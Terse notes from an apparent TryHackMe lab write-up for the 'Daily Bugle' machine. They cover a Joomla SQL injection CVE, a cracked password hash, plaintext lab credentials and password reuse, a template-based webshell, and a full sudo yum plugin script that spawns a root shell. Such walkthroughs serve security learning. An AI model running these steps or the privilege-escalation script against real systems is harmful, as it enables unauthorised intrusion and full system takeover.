# THM: Daily Bugle
# OS: Linux (Hard)

----

[NOTES]
- Joomla CMS at http://$ip/ is vulnerable to `CVE-2017-8917`
- Found Joomla password:
  - jonah:spiderman123
- MySQL creds:
  - root:nv5uz9r3ZEDzVjNu
- Found password reuse:
  - `MySQL:root | internal:jjameson` ~ nv5uz9r3ZEDzVjNu


Usernames:
  - jonah (Joomla)
  - jjameson (Linux Account)
  - root (MySQL)

Passwords:
  - nv5uz9r3ZEDzVjNu (MySQL|root) (System|jjameson)
  - spiderman123 (Joomla|jonah)

----

## Foothold

[WEB]
**Port -> 80**
- Get version information from `http://$ip/README.txt`
- Found CVE (SQLi):
  - CVE-2017-8917
  - 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
  Hash cracked: spiderman123

- Get webshell from modifying Joomla templates.

## PrivEsc
**apache -> jjameson**
- Credentials for jjameson was found on `/var/www/html/configuration.php` (Password reuse):
  - user `apache` can escalate their privileges to `jjameson` by using `su`
    - User: jjameson
    - Pass: nv5uz9r3ZEDzVjNu

**jjjameson -> root**
- We can run yum as root with no pass, this is dangerous since we can create malicious plugins/packages. And get root.

```shell
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```
